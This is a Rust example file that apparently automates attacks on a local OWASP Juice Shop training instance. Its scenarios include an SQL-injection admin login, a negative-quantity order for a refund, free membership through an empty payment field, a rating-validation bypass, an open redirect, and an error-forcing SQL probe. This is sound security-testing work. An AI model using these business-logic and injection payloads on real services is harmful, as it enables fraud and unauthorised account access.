//! Input Validation & Business Logic Scenarios
//!
//! Tests for input validation bypass and business logic flaws.
//!
//! Run with: cargo run --example juice_shop_validation

use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== Input Validation Scenarios ===\n");

    let results = vec![
        zero_stars().await?,
        empty_user_registration().await?,
        payback_time().await?,
        deluxe_fraud().await?,
        missing_encoding().await?,
        outdated_allowlist().await?,
        error_handling().await?,
        weird_crypto().await?,
        vulnerable_library().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ Rating/Score Manipulation ============

async fn zero_stars() -> Result<ScenarioResult> {
    Scenario::new("Zero Stars - Rating Validation Bypass")
        .base_url(BASE_URL)
        .tags(&["validation", "rating", "difficulty-1"])
        .step("Get captcha", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha
                .get("captchaId")
                .and_then(|v| v.as_i64())
                .unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");
            ctx.set_var_async("captcha_id", captcha_id.to_string())
                .await;
            ctx.set_var_async("captcha_answer", answer).await;
            ok()
        })
        .step(
            "Submit 0-star rating",
            |ctx: Arc<ScenarioContext>| async move {
                let captcha_id: i64 = ctx.get_var_async("captcha_id").await?.parse().unwrap_or(0);
                let answer = ctx.get_var_async("captcha_answer").await?;

                // Send rating of 0 (should be 1-5)
                let resp = ctx
                    .post("/api/Feedbacks")
                    .json(&serde_json::json!({
                        "comment": "Zero stars - validation bypass",
                        "rating": 0,
                        "captchaId": captcha_id,
                        "captcha": answer
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Zero-star feedback accepted!")
                } else {
                    fail("Validation working correctly")
                }
            },
        )
        .run()
        .await
}

// ============ Empty/Null Input ============

async fn empty_user_registration() -> Result<ScenarioResult> {
    Scenario::new("Empty User Registration")
        .base_url(BASE_URL)
        .tags(&["validation", "empty-input", "difficulty-2"])
        .step(
            "Register with empty fields",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .post("/api/Users")
                    .json(&serde_json::json!({
                        "email": "",
                        "password": ""
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Empty user registered!")
                } else {
                    ok_with("Empty registration attempted")
                }
            },
        )
        .run()
        .await
}

// ============ Numeric Manipulation ============

async fn payback_time() -> Result<ScenarioResult> {
    Scenario::new("Payback Time - Negative Quantity")
        .base_url(BASE_URL)
        .tags(&["validation", "negative", "difficulty-3"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Order with negative quantity",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;

                // Negative quantity = negative price = getting money back
                let resp = ctx
                    .post("/api/BasketItems")
                    .bearer_auth(&token)
                    .json(&serde_json::json!({
                        "ProductId": 1,
                        "BasketId": 1,
                        "quantity": -100
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Negative quantity order placed!")
                } else {
                    ok_with("Negative order attempted")
                }
            },
        )
        .run()
        .await
}

async fn deluxe_fraud() -> Result<ScenarioResult> {
    Scenario::new("Deluxe Fraud - Empty Payment Mode")
        .base_url(BASE_URL)
        .tags(&["validation", "business-logic", "difficulty-3"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op")
                .await?;
            ok()
        })
        .step(
            "Get deluxe without payment",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("auth_token").await?;

                // Empty payment mode = free membership
                let resp = ctx
                    .post("/rest/deluxe-membership")
                    .bearer_auth(&token)
                    .json(&serde_json::json!({
                        "paymentMode": ""
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Deluxe membership without payment!")
                } else {
                    ok_with("Fraud attempted")
                }
            },
        )
        .run()
        .await
}

// ============ Encoding Issues ============

async fn missing_encoding() -> Result<ScenarioResult> {
    Scenario::new("Missing Encoding - Hash Character")
        .base_url(BASE_URL)
        .tags(&["validation", "encoding", "difficulty-1"])
        .step(
            "Access file with encoded #",
            |ctx: Arc<ScenarioContext>| async move {
                // # must be encoded as %23
                let resp = ctx
                    .get("/assets/public/images/uploads/%23zatschi%23.md")
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Cat image accessed with %23 encoding")
                } else {
                    fail("Encoding issue not exploited")
                }
            },
        )
        .run()
        .await
}

// ============ Redirect Validation ============

async fn outdated_allowlist() -> Result<ScenarioResult> {
    Scenario::new("Outdated Allowlist - Old Crypto Address")
        .base_url(BASE_URL)
        .tags(&["validation", "redirect", "difficulty-1"])
        .step("Redirect to old address", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm")
                .no_redirect()
                .send()
                .await?;

            if resp.status.as_u16() == 302 || resp.status.as_u16() == 301 {
                ok_with("Redirect to outdated address allowed")
            } else {
                fail("Redirect blocked")
            }
        })
        .run()
        .await
}

// ============ Error Disclosure ============

async fn error_handling() -> Result<ScenarioResult> {
    Scenario::new("Error Handling - Stack Trace Exposure")
        .base_url(BASE_URL)
        .tags(&["validation", "error-handling", "difficulty-1"])
        .step(
            "Trigger detailed error",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx
                    .get("/rest/products/search")
                    .query("q", "';")
                    .send()
                    .await?;

                if resp.status.as_u16() == 500 || resp.contains("error") || resp.contains("SQLITE")
                {
                    ok_with("Detailed error exposed")
                } else {
                    fail("Errors handled properly")
                }
            },
        )
        .run()
        .await
}

// ============ Vulnerability Reporting ============

async fn weird_crypto() -> Result<ScenarioResult> {
    Scenario::new("Weird Crypto - Report MD5 Usage")
        .base_url(BASE_URL)
        .tags(&["validation", "crypto", "difficulty-2"])
        .step(
            "Report MD5 weakness",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/rest/captcha").send().await?;
                let captcha = resp.json_value()?;
                let captcha_id = captcha
                    .get("captchaId")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(0);
                let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");

                let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "comment": "Reporting use of weak MD5 hashing algorithm for password storage",
                    "rating": 1,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

                if resp.is_success() {
                    ok_with("Reported MD5 weakness")
                } else {
                    fail("Report failed")
                }
            },
        )
        .run()
        .await
}

async fn vulnerable_library() -> Result<ScenarioResult> {
    Scenario::new("Vulnerable Library - Report sanitize-html")
        .base_url(BASE_URL)
        .tags(&["validation", "vulnerable-components", "difficulty-4"])
        .step(
            "Report vulnerable library",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/rest/captcha").send().await?;
                let captcha = resp.json_value()?;
                let captcha_id = captcha
                    .get("captchaId")
                    .and_then(|v| v.as_i64())
                    .unwrap_or(0);
                let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");

                // Report the specific vulnerable version found in package.json.bak
                let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "comment": "Vulnerable library detected: sanitize-html 1.4.2 (CVE-2017-16028)",
                    "rating": 1,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

                if resp.is_success() {
                    ok_with("Reported sanitize-html 1.4.2")
                } else {
                    fail("Report failed")
                }
            },
        )
        .run()
        .await
}
